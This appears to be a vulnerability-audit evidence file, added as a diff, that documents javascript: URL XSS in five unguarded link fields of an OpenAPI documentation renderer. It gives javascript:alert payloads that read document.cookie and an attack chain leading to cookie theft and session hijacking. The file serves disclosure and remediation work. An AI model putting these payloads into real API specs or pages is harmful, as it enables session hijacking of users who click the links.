@@ -1,0 +1,31 @@
+=== H3 javascript: injection — Impact Evidence ===
+
+Vulnerable sink verification:
+  [VULNERABLE]  authorizationUrl  in  [REDACTED].tsx
+  [VULNERABLE]  info.contact.url  in  src/components/ApiInfo/ApiInfo.tsx
+  [VULNERABLE]  info.license.url  in  src/components/ApiInfo/ApiInfo.tsx
+  [VULNERABLE]  info.termsOfService  in  src/components/ApiInfo/ApiInfo.tsx
+  [VULNERABLE]  externalDocs.url  in  [REDACTED].tsx
+
+Scheme guard search:
+  No scheme validation guards found — all sinks confirmed unprotected.
+
+Malicious spec fields (javascript: scheme):
+  authorizationUrl      = javascript:alert('XSS-authorizationUrl: '+document.cookie)
+  info.contact.url      = javascript:alert('XSS-contact-url: '+document.cookie)
+  info.license.url      = javascript:alert('XSS-license-url: '+document.cookie)
+  info.termsOfService   = javascript:alert('XSS-termsOfService: '+document.cookie)
+  externalDocs.url      = javascript:alert('XSS-externalDocs-url: '+document.cookie)
+
+Attack chain:
+  1. Attacker crafts/controls OpenAPI spec with javascript: in any URL field.
+  2. Acme renders the spec — field value flows through model layer to JSX
+     <a href={...}> with NO scheme validation at any point in the pipeline.
+  3. Rendered HTML contains: <a href="javascript:alert(...)">...</a>
+  4. Victim clicks link → JavaScript executes in page origin → cookie theft,
+     session hijacking, or arbitrary JS execution in the embedding application.
+
+Impact: XSS in origin of Acme-embedding application.
+Severity: HIGH (requires user click; spec must be attacker-controlled).
+
+Generated: 2026-05-19T04:01:58.223Z
